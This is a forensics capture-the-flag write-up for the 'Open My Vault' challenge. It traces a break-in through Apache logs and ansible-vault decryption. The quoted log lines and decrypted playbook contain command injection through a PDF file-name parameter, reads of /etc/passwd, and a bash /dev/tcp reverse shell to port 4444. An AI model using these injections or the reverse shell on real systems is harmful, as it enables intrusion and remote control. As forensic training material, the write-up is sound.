# Open my vault

[root-me challenge](https://www.root-me.org/en/Challenges/Forensic/Open-My-Vault): The DevOps of your SI reports that the Ansible master has been running strange playbooks on machines. You tell him that it was not a good idea to install Ansible on the same machine as the website, but that you will investigate. In prevention, he says he has put the site in maintenance and removed SSH keys on the nodes, but that he has not touched the logs.

The challenge is available via the CTF-ATD "Open My Vault" machine. There is no need to root it.

----

Check the user's history:

```text
    1  id 
    2  cat /etc/passwd
    3  pwd 
    4  cd /home/m4st3r/
    5  ping 128.66.0.0
    6  cat /etc/shadow
    7  l 
    8  ll
    9  cd ansible/
   10  ls -lah
   11  tree . 
   12  cat inventory.cfg 
   13  cat playbook.yml 
   14  cat roles/zip/tasks/main.yml 
   15  mkdir roles/other
   16  mkdir roles/other/tasks
   17  ansible-vault -h
   18  ansible-vault create roles/other/tasks/main.yml
   19  vim playbook.yml 
   20  ansible-playbook -h 
   21  ansible-playbook -i inventory.cfg --vault-password-file=/tmp/.secure playbook.yml 
   22  rm /tmp/.secure 
   23  cd ..
   24  rm -rf .ssh
```

`m4st3r` ran an encrypted playbook with the password located in `/tmp/.secure` and then removed `/tmp/.secure`.

He may have forgotten to remove the log. Check `/var/log/apache2/access.log`:

```text
m4st3r@my_v4ult:~$ cat /var/log/apache2/access.log | grep ".secure"
203.0.113.0 - - [03/Sep/2022:13:34:31 +0200] "GET /pdf.php?name=a.pdf;echo%20%22C4tXk9ctpG9QEMeL%22%20%3E%20/tmp/.secure HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
m4st3r@my_v4ult:~$ cat /var/log/apache2/access.log | grep "pdf.php?"
203.0.113.0 - - [03/Sep/2022:13:32:24 +0200] "GET /pdf.php?name=website_report.pdf HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
203.0.113.0 - - [03/Sep/2022:13:32:42 +0200] "GET /pdf.php?name=a.pdf;id HTTP/1.1" 200 59 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
203.0.113.0 - - [03/Sep/2022:13:32:51 +0200] "GET /pdf.php?name=a.pdf;pwd HTTP/1.1" 200 52 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
203.0.113.0 - - [03/Sep/2022:13:33:11 +0200] "GET /pdf.php?name=a.pdf;whoami HTTP/1.1" 200 40 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
203.0.113.0 - - [03/Sep/2022:13:33:15 +0200] "GET /pdf.php?name=a.pdf;cat%20/etc/issue HTTP/1.1" 200 58 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
203.0.113.0 - - [03/Sep/2022:13:33:21 +0200] "GET /pdf.php?name=a.pdf;cat%20/etc/passwd HTTP/1.1" 200 593 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
203.0.113.0 - - [03/Sep/2022:13:33:56 +0200] "GET /pdf.php?name=a.pdf;ls%20/home/m4st3r HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
203.0.113.0 - - [03/Sep/2022:13:34:02 +0200] "GET /pdf.php?name=a.pdf;ls%20/home/m4st3r/ansible HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
203.0.113.0 - - [03/Sep/2022:13:34:31 +0200] "GET /pdf.php?name=a.pdf;echo%20%22C4tXk9ctpG9QEMeL%22%20%3E%20/tmp/.secure HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
203.0.113.0 - - [03/Sep/2022:13:34:57 +0200] "GET /pdf.php?name=a.pdf;bash%20-i%20%3E&%20/dev/tcp/128.66.0.0/4444%200%3E&1 HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
```

Attack via a `.pdf`. urldecode the last two commands for clarity:

```text
echo "C4tXk9ctpG9QEMeL" > /tmp/.secure
bash -i >& /dev/tcp/128.66.0.0/4444 0>&1
```

Decrypt the vault's `.secure` password:

```text
m4st3r@my_v4ult:~$ echo "C4tXk9ctpG9QEMeL" > /tmp/.secure
```

In the ansible directory:

```text
m4st3r@my_v4ult:~/ansible$ ansible-vault decrypt --vault-pass-file /tmp/.secure roles/other/tasks/main.yml
Decryption successful
```

```text
m4st3r@my_v4ult:~/ansible$ cat roles/other/tasks/main.yml
- name: "hack the planet" 
  ansible.builtin.shell: "bash -i >& /dev/tcp/128.66.0.0/4444 0>&1"

- name: "If someone search for a Flag ^^"
  ansible.builtin.shell: "echo 'redacted!!' > /flag"

```
